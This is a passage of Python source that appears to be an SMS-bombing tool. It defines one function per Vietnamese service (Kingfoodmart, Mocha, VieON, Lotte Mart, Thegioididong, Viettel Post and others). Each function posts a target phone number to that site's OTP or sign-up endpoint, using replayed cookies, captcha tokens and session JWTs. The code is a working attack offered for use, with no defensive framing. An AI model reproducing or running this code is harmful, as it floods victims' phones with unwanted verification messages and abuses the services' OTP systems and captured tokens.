Hzf9iwdflyZuYTlF5uW2_LmgK5N8KRc9DLwTeWcN6X1TTBoieiFmJE7jTfarM62TyVbwvLZ2DWo7FAJWJkps0flhLiWWALi512oIKNL2qHcqaDIj2Z79e7zXLov_vb9E_5MHRiNLP44JdxFACiNx4fvnbuqKY83CEyW',
    'reCaptchaTokenV2': '',
    'socialToken': '',
    'socialType': '',
    '__RequestVerificationToken': 'CfDJ8DeM8It-JwlAhxpbhi7u5Q_JC6FgmT1PiVg9etA3FaIA3zdpLfRbB5FxYW_aTDCUimWRXmg-BlEN7cGcU_ByalaiIJXTkw-DXLxqD47w3d4xBsiRMniGoO_lZXa3iddVzLCG-H4bcHN0S-FkyPM0QUg',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def kingfoodmart(phone):
    headers = {
    'domain': 'kingfoodmart',
    'x-ol-thumbnail-height': '250',
    'sec-ch-ua-platform': '"Windows"',
    'Referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'accept': '*/*',
    'x-ol-thumbnail-width': '250',
    'content-type': 'application/json',
}

    json_data = {
    'operationName': 'SendOtp',
    'variables': {
        'input': {
            'phone': phone,
            'captchaSignature': '03AFcWeA7R4-UvV29jYoF3u1O6HEmJkrEXrmlWAtiYBCkLpPm7j1iuCsfBmqNUG7wG20lyIoracCakH5Wh-t81xWmzPEiAPwJCq1Xo5gVrj_sjY8RYYYWGZVFP9r-6kTmbXcSbPmNdmcwCvQ72wAyk2tifcqIUCTVoNeZ-P7AE5jninzGJb26Y78pnr09Z7-004vwOEIaz5T_ucBo-Qj7HJUT1nwn80MwGvGgn9g-BWC-vcKEY_LzJTbe90YSsWmONdvB-uxEy3XmoXJjynL0eWfO8dQM0olXkTr9sWl1qUPbdxCV_QcKeG0CBP_GTqoMnDqHFtyrXMkXmb2bjSP4lP_XdBD-SBnvAV2A5caiuXrSv_0taqKYttnmb8PR6wrZY7P0zAyUoyuGxim06Xl2E4gOP9tP1tfD5yU0Lr2gocTB2EVAHTpPXc9OPGo30uObbjHjymZDds_czqWFkbDlTVi9dSX-I1ryMbNykkGzyUExQSDE-VEAKIcdIbVVhGxHFt5PKcV9Jlnqv6gIq_kwfJphNLM_ttJNLUZThY6dTqFy3ziwwxHKewzAcO071UcwXLAMHavsyO4u0AuaFK-CpiAY_6GhrPHTXpESlKCQpOtmw2LAtm1QO0sk3ZyxYaGjavJXC8rIYBolqXB6xjVwaBzpqKvyJ1h0uV2blVpiEPdaUoGLGNy0fGIHC-wiEgxuEsSmmpFV8DThA1n-ffvyElgsAqlmPuxW9sthapibuhGizpZgbREqlYfNNJfilRi9PqAOtJiXfXjmaeFuGDTYcyyEtTcTHg19yOY7gZ6bzoQTKie0xeAx-WQLGzIgUG0VX6_v0pm2mbFD6u87SPBONx5FlCvXr59FBPrlS12PEG8xuBcOtL4gSFR8MhxpAtcHLXEFxKz1W9pKG_xMOv9216m11IpNhxxc8ofR7FM_cS4qrRPOA5PIE1LEz7KsSza81f-ChFq8UVRaEvtGwMKGqHboIqtP5Bd--uBkIpKDU3VOeJ2FO88KF6CxunQmtPGOGh4YJgMx6n3ImAXSi1Zy_memFEYudyqYFuJ5EhjsYg8fYrX6KjhpADQLD4jz9g8OtfrlG0QXavgAAOiyK-3EjXNqY-JOuKc5qqyr4AV4x44hJ1YmR32uN_1XW9w7P477UWrA-PGQbxWZEKbS9tvuFX2lo2O2T18c7Ktt-mv73k5k_u5JBfPQYdQHMT2wBSV9duIb5WtGQtoJi5TGhITyNgQ_uMFe0i8gLD-3m13FrztVh9GWPe5Siy8ubdhsry9wAICrrHPkVeAYUI9rUgUnkQZvrzB_2qwBWzBGs8_TRevDWYsYc8lhu4hSM5ArwCYDQZlJ-iyByYp7DfnBNE6zwDfFKzxD78d4Pc4WzndZVr3mlTvqu32uWcDLa2DckqnM-pBqxXGBLhTe3WS-8t1ctyl2WXiw3VAGCsY6etm2Ufg_KVXa40pF_Eke774ttL_5dcgXWPB9JTAfxzE_OimmrTQrOMYzgDtDsrII0p94E4BbMI3yAQEiAh0QqP0tEezz55z2qwMKXyalylVcQNR7TQgneImu2EAQJAjcxABv3_u8ym0DlFbY_ocdNa5GtWI2yAd_wVTVibBqMVIlbrH28B5fEIoGCBoK7XRyHjeDRDCSI3OfEMQqBG9Qz1UBKI_WZLdrKDR2l1pAR5jtdlTaYFtWBnb7dasRYZ1MUIeOvW6KbCK9lSAb7Ie407CQEs8zkv7T6YIbS6Xn2FgnfJRk6aU6Yd0KrQbIEuI2Ug2FI22-JJmlsgzCby-5-IUM6_iVqVVvmVxDwrh6OjBhup0SRWbCEpTZptlVM_RDGw8BwFCqqP9pOLo3X6F2i_w-32al9-QiIMgTukS2XsejS_pp4ZnqpkLsnKLPtwPevDtDjnbvlrUOTHPr_5XlSn6sxikaSVEphx5CNS2Dkg6x0VFHpMvRladiLLNwvbixumLEFN3Tf3VBnjAhMSR0XmriGRaTJ9FZY98Z4RReFo58SYCqmBOcsgQXNkPGfDD79CJKZdroZLn16Z6Zfezqtrk35D92tXgvZYm8Uihc25WA2HT0tcMhCyJhtA1ZOkGscCOcdFiIJoW-Y-emEgQR5zI8O_AKLMQjMDOhxbtV9w7H2SkphDer1Y0jJ78fCWg',
            'method': 'ZALO',
        },
    },
    'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def mocha(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
def vieon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDYxNzAzOTMsImp0aSI6ImYwZWI3MzFmZTFhMTQzNTZiNjI4NGI1NzVhZTIwNGIwIiwiYXVkIjoiIiwiaWF0IjoxNzQ1OTk3NTkzLCJpc3MiOiJWaWVPbiIsIm5iZiI6MTc0NTk5NzU5Miwic3ViIjoiYW5vbnltb3VzXzhjYTZhNWQ2ODVjZjQyMTBlMjRhYjZmZmU0NmNhMjI0LTZiNGU2MWVjODAxYjgxOTljMDRmNGYzODA1MmM2ODEwLTE3NDU5OTc1OTMiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiOGNhNmE1ZDY4NWNmNDIxMGUyNGFiNmZmZTQ2Y2EyMjQtNmI0ZTYxZWM4MDFiODE5OWMwNGY0ZjM4MDUyYzY4MTAtMTc0NTk5NzU5MyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.wu0CHdId_huSUMeBRyrkp5fNnRSVbxkzDewF9BfdMEg',
    'content-type': 'application/json',
    'origin': 'https://vieon.vn',
    'priority': 'u=1, i',
    'referer': 'https://vieon.vn/auth/?destination=/&page=/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
}

    params = {
    'platform': 'web',
    'ui': '012021',
}

    json_data = {
    'username': phone,
    'country_code': 'VN',
    'model': 'Windows 10',
    'device_id': '8ca6a5d685cf4210e24ab6ffe46ca224',
    'device_name': 'Chrome/135',
    'device_type': 'desktop',
    'platform': 'web',
    'ui': '012021',
}

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
def lotte(phone):
    cookies = {
    '__Host-next-auth.csrf-token': 'aad9ef2622f3686a1b29c005a968fe522782b3139e856c5535a6837b59e43f93%7Cd9014825dbea56a28b475d9b0eed107b63fbd59ce9d94f021e4da40d9072b486',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_ga': 'GA1.1.758687210.1746086161',
    '_ga_6QLJ7DM4XW': 'GS1.1.1746086161.1.0.1746086161.60.0.0',
    '_gcl_au': '1.1.1591328187.1746086161.437253800.1746086161.1746086161',
    '_fbp': 'fb.1.1746086161768.71227929277722508',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.lottemart.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'x-appcheck-token': 'eyJraWQiOiJEX28wMGciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjcxMjk3MTkwMDMyOTp3ZWI6YzdiZDdmODk3NTY4YWQ5ZjhjMjBiOCIsImF1ZCI6WyJwcm9qZWN0c1wvNzEyOTcxOTAwMzI5IiwicHJvamVjdHNcL2xvdHRlbWFydC0zODMzMTIiXSwicHJvdmlkZXIiOiJyZWNhcHRjaGFfdjMiLCJpc3MiOiJodHRwczpcL1wvZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbVwvNzEyOTcxOTAwMzI5IiwiZXhwIjoxNzQ2MTcyNjAwLCJpYXQiOjE3NDYwODYyMDAsImp0aSI6InBpNnhQRnhUazJTOGRBMmY3OUpHNXZ3Wmk4LVFtM0xVdVZwd3pYZDNac0UifQ.eMXTYp_UJiTguBjOQDCE25VaWzsbitVFvTUBeMa6qnD1kVs-FyTPybboxU9fdPllev4Dd_mAqYNJOFzvbkN-G_hBQb7XEarm4c9j6dsJ8973h4ONS2GuI_nM2DMBupz0HKw0xkDZS7Wtzroq-Umv8xCE3sbqEG7iyNiWyn-6Rip9UhBdxliL-GqJxQmIPrnd3EqUH2oitFWzqWV8_BeK_lJa2wkbqDR3JE7VuqwtpEuk8WdJqBSQZlFrNr1YPTTCRx7wZiM5oxDxkr25XIF2HfJWO1OmUlTSi-oeHC78UnXWAhKNYhAyze505cLuCOGXVfel5vQpVAzRmOovEQbZisocnnsPBbuDcFpW_hwEpjLyU1hfB6Sh_z0FtR75EOgjEz6FE3xZlRAply4lOvQW2ZHbFI17menW0Wm_c5P4KJYuHKyTRp9vGdSHm50swjdJV64gM9dXUe1Jn1LNvPQFN0MbKBNGBMZC9CeXAD4la6SMn_dcUwSockxwkm7BOsdG',
    # 'cookie': '__Host-next-auth.csrf-token=aad9ef2622f3686a1b29c005a968fe522782b3139e856c5535a6837b59e43f93%7Cd9014825dbea56a28b475d9b0eed107b63fbd59ce9d94f021e4da40d9072b486; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga=GA1.1.758687210.1746086161; _ga_6QLJ7DM4XW=GS1.1.1746086161.1.0.1746086161.60.0.0; _gcl_au=1.1.1591328187.1746086161.437253800.1746086161.1746086161; _fbp=fb.1.1746086161768.71227929277722508',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def tgdd(phone):
    cookies = {
    '_gcl_au': '1.1.929628718.1744201143',
    '_fbp': 'fb.1.1744201146500.407781687620634076',
    '_tt_enable_cookie': '1',
    '_ttp': '01JRD7TR7TGHYT2BG05DP2VWZF_.tt.1',
    '_pk_id.1.8f7e': '8c5927c2f87b4dd7.1744201148.',
    '_ce.s': 'v~1c7e876cc8e0eb39aaf69e29ca3ae18c5692e58d~lcw~1744201935000~vir~new~lva~1744201144706~vpv~0~v11.cs~453625~v11.s~062b3a50-153d-11f0-adc2-e9915eb3b75d~v11.sla~1744201425974~v11.fhb~1744201368941~v11.lhb~1744201995004~lcw~1744201995006',
    'TBMCookie_3209819802479625248': '255219001746086414Z+Qz0DFM8uKcqkCxQQYwtfyeKoo=',
    '___utmvm': '###########',
    'DMX_Personal': '%7B%22UID%22%3A%22c7a1a4e0026471665ff68fb1951efe467d0cf69f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
    'mwgngxpv': '3',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8HjlFm50bqhDkXgTFR2ID0qq_XGTVhBVT8FB7BKpotMqi4eoUlUkceJevagyugTuCPCHXLK-96V0YfCIRzn2miKmM5MLuu-I350LLVWqYKuGb_d2Cv9ybhE-lbeY2AL29f4a4sya49yg8NoaNNqHiqQ',
    '_ga': 'GA1.2.1787420372.1744201144',
    '_gid': 'GA1.2.1801075880.1746086417',
    '_gat': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1746086418.1.0.1746086418.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1746086417.2.0.1746086419.58.0.0',
    'ttcsid': '1746086420473::6Imx-3_rQetDp-_74vdB.2.1746086420473',
    '_pk_ref.1.8f7e': '%5B%22%22%2C%22%22%2C1746086421%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.1.8f7e': '1',
    'MWG_ORDERHISTORY_SS_1': 'CfDJ8HjlFm50bqhDkXgTFR2ID0pzuomSygYkUZ0MEu0K12%2BCfHKbyR9QJExN7GxgGKboKOt6Fjwx0TPC%2Fz5z7XoxzM0D%2Fd%2BI0ZkG%2F3nWskQib4FbbVWV0hlD41VSCNOcmAzAC6xM9beEr6OdatrL9Xv97bEJLdodaStc6ZlkcALyxiEV',
    '_oauthCDP_WebTGDD_Production': '2EICzzDZp6kF5eMW_uhQiOz_0DxH5GC_LHCO9j0FJtDD9YhakuY2GLBdLyPhGGRlkhHMJFVEH5vvTl9xxPxXuQmzEP1Vckle5O6b5jj7Wk1Wz39IMjKdbjqHXGoskDK2qDjtKjeBBKtktqfNeaXdAoermg94J2bvdVrmg94BiJ82fKnnWBO4_y9b4udd6pvGYXXL8vn3iFHJtcDppPJCtlBNSfkMvR7I4pVWUPTBjgEbUZMgZoFrmg94EW4ItZ90llGNW5jlYC7FqSBSDsfFZsdvLS5atK8rmg941kLH4c4pvS8srmg94YNzTHnoE4f3J7l4otbWxNoPaU_IgDwJCe8fastOYAy910O87NUJDnrmg943qnWSumdf4v5pGVajvuhGiEmAQsMWoydpXrmg94IVIbEXGQXRTwzcHVpykLNBc4mb37rlG56rmg94sJzZ',
    'SvID': 'beline26121|aBMqK|aBMqE',
    'ttcsid_CANVQ2RC77UFDAKT9FD0': '1746086420472::idCBXSsJ--3LtozKVHWt.2.1746086460184',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://www.thegioididong.com',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': '_gcl_au=1.1.929628718.1744201143; _fbp=fb.1.1744201146500.407781687620634076; _tt_enable_cookie=1; _ttp=01JRD7TR7TGHYT2BG05DP2VWZF_.tt.1; _pk_id.1.8f7e=8c5927c2f87b4dd7.1744201148.; _ce.s=v~1c7e876cc8e0eb39aaf69e29ca3ae18c5692e58d~lcw~1744201935000~vir~new~lva~1744201144706~vpv~0~v11.cs~453625~v11.s~062b3a50-153d-11f0-adc2-e9915eb3b75d~v11.sla~1744201425974~v11.fhb~1744201368941~v11.lhb~1744201995004~lcw~1744201995006; TBMCookie_3209819802479625248=255219001746086414Z+Qz0DFM8uKcqkCxQQYwtfyeKoo=; ___utmvm=###########; DMX_Personal=%7B%22UID%22%3A%22c7a1a4e0026471665ff68fb1951efe467d0cf69f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8HjlFm50bqhDkXgTFR2ID0qq_XGTVhBVT8FB7BKpotMqi4eoUlUkceJevagyugTuCPCHXLK-96V0YfCIRzn2miKmM5MLuu-I350LLVWqYKuGb_d2Cv9ybhE-lbeY2AL29f4a4sya49yg8NoaNNqHiqQ; _ga=GA1.2.1787420372.1744201144; _gid=GA1.2.1801075880.1746086417; _gat=1; _ga_TZK5WPYMMS=GS1.2.1746086418.1.0.1746086418.60.0.0; _ga_TLRZMSX5ME=GS1.1.1746086417.2.0.1746086419.58.0.0; ttcsid=1746086420473::6Imx-3_rQetDp-_74vdB.2.1746086420473; _pk_ref.1.8f7e=%5B%22%22%2C%22%22%2C1746086421%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.1.8f7e=1; MWG_ORDERHISTORY_SS_1=CfDJ8HjlFm50bqhDkXgTFR2ID0pzuomSygYkUZ0MEu0K12%2BCfHKbyR9QJExN7GxgGKboKOt6Fjwx0TPC%2Fz5z7XoxzM0D%2Fd%2BI0ZkG%2F3nWskQib4FbbVWV0hlD41VSCNOcmAzAC6xM9beEr6OdatrL9Xv97bEJLdodaStc6ZlkcALyxiEV; _oauthCDP_WebTGDD_Production=2EICzzDZp6kF5eMW_uhQiOz_0DxH5GC_LHCO9j0FJtDD9YhakuY2GLBdLyPhGGRlkhHMJFVEH5vvTl9xxPxXuQmzEP1Vckle5O6b5jj7Wk1Wz39IMjKdbjqHXGoskDK2qDjtKjeBBKtktqfNeaXdAoermg94J2bvdVrmg94BiJ82fKnnWBO4_y9b4udd6pvGYXXL8vn3iFHJtcDppPJCtlBNSfkMvR7I4pVWUPTBjgEbUZMgZoFrmg94EW4ItZ90llGNW5jlYC7FqSBSDsfFZsdvLS5atK8rmg941kLH4c4pvS8srmg94YNzTHnoE4f3J7l4otbWxNoPaU_IgDwJCe8fastOYAy910O87NUJDnrmg943qnWSumdf4v5pGVajvuhGiEmAQsMWoydpXrmg94IVIbEXGQXRTwzcHVpykLNBc4mb37rlG56rmg94sJzZ; SvID=beline26121|aBMqK|aBMqE; ttcsid_CANVQ2RC77UFDAKT9FD0=1746086420472::idCBXSsJ--3LtozKVHWt.2.1746086460184',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    'reCaptchaToken': '03AFcWeA4i4Fw_kEY5bqypgJo4ZnmhmJghRJcriJd_Ika4SB5gVlzRsJ1CHc5z4aAK8XiDgOEmJchKIM6GPRn-Wa8uk21rKZnNNFRKlFF4mZeVHKlc1l47D11KAJGiaEYu3rIlJgikLOhJWfti83o_re9CZT-QWOweBK9IwDXLHLU6L2GDTk7op4pUtz7TEHb4A1sYouwaOpjbveTLc1-GXss5b6ztuyReTAotj5Dcpr0c_9bZ8sGHuANDI-VqVFoqVxFP4j7wcasFo17I0vXTVPA7PPuJsYgt2JZGfNk1KZoOqm_P9903Lo8m2pXOns5jQftunxpc0QgFciriZS8h-eU_SML8GNFhlZ6qmw-kEUgvkWx17WjyIlgrowcjZ3ojVBLUvSuDAzEJKKfDjVa49BfKNLHt_DdFkUmljHxtCKPf3kwJdUWXtl-oAcqqrsEGpniH-g28Xhk3s7njOW4UFkNVlp4tcANT7YPKFf4ZWot5u-z_mZOTHI8Am2uhhj5wMM9_PtgTC8mMLBxC4io7sWLG_iJXgEeerW1Ez1V9O-gaAtTn2BUmB-Fu-do-38Br5sEvnCa1vezhPoEYPgP_ZVv2B13-5OjD_UT8n_xjso67y8JspSi1oKQmWQnTiONfB3hjaZcio-ngatXGDBI3htxRF2BmAHCtQpnh2LeupljnJbXlW-lDpJHE65iUWKE-CqpGvCG4S-kot2M7OhxlRLUCFsWkkxfIFSEGK-b6_TSU1BViVr-HQex5IjgfJkxlNT2i2iEg9R4xTg7YjGlgBGq0cJ67A4MZPnKZCs06XUoP0XLIbs2fFhPhGPzqgP2SIHYIbxUTw-YDzBwkkf__-zpGlGDYxK1WTdi0xq-dtTytYKhOsWb2OscwWWMeI-wBJiJziX-BXhVzsHnTJE7pg7Un_PjOtB-qvAHK75Afinbk8MaSwmMSRtI52bnf-F35Zx9Zu6Un_QrxNcTZrJYBLw7lGJi1CZQ1a04c5ryH-dg2vjBfjQzSiQjwuQwymUhXSo2xttKxbcea',
    'reCaptchaTokenV2': '',
    'socialToken': '',
    'socialType': '',
    '__RequestVerificationToken': 'CfDJ8HjlFm50bqhDkXgTFR2ID0rg889HQEe966xPzi48j8Nnklgu1bPx9lZqx-0RiKJs4nrS11nKVr_1CHAbPihx5TiXX0iHYW-ybcuc8Xekf899TzsWoP2JB52DGt0TwhQRke1YKcYT-nz8N2rhcSQS-IM',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def viettelpost(phone):
    cookies = {
    '_gid': 'GA1.2.1664590281.1746086657',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.125.23_15001',
    '_ga_L7ZKY279LR': 'GS1.1.1746086660.1.0.1746086660.0.0.0',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8Pv1EAmKjcZHptazQUm4j4sPCB6574vVAW4hBTj8ZtMC4FgwMizdvyyMI3YJsJ98NYcTP1Ckaqwv2WsLOOo56XuSVui41hrNIegEZjA42Ix-0HTo8n7C5ViegI5sdFNShvVvN2aNpXF0SmprZTNWAlI',
    '_ga_9NGCREH08E': 'GS1.1.1746086656.1.0.1746086660.56.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1746086663.1.1.1746086665.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1746086663.1.1.1746086665.0.0.0',
    '_ga': 'GA1.1.1826266576.1746086657',
    '_ga_P86KBF64TN': 'GS1.1.1746086664.1.1.1746086680.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'null',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    # 'Cookie': '_gid=GA1.2.1664590281.1746086657; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.125.23_15001; _ga_L7ZKY279LR=GS1.1.1746086660.1.0.1746086660.0.0.0; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8Pv1EAmKjcZHptazQUm4j4sPCB6574vVAW4hBTj8ZtMC4FgwMizdvyyMI3YJsJ98NYcTP1Ckaqwv2WsLOOo56XuSVui41hrNIegEZjA42Ix-0HTo8n7C5ViegI5sdFNShvVvN2aNpXF0SmprZTNWAlI; _ga_9NGCREH08E=GS1.1.1746086656.1.0.1746086660.56.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1746086663.1.1.1746086665.0.0.0; _ga_WN26X24M50=GS1.1.1746086663.1.1.1746086665.0.0.0; _ga=GA1.1.1826266576.1746086657; _ga_P86KBF64TN=GS1.1.1746086664.1.1.1746086680.0.0.0',
}

    data = {
    'FormRegister.FullName': 'sdjfhs jdfjk sd',
    'FormRegister.Phone': phone,
    'FormRegister.Password': '97XSV3eC#D$Ai#r',
    'FormRegister.ConfirmPassword': '97XSV3eC#D$Ai#r',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=um6mvohlarlxec05vmyxi',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8Pv1EAmKjcZHptazQUm4j4thmgDGLS6mg8snxx4l_oKx6UGZuF26yw3_UvNdVF0wgsHSLTzspXmcpY8R3kGO3YixAbNxWUkqpovz_jPiJjOBG8zo7ZaPNp9C6ZFAiWk2L4FvbdkJWOuiJF38Ms4fcPA',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def vuihoc(phone):
    cookies = {
    'VERSION': '1',
    'WEB_LOP': '1',
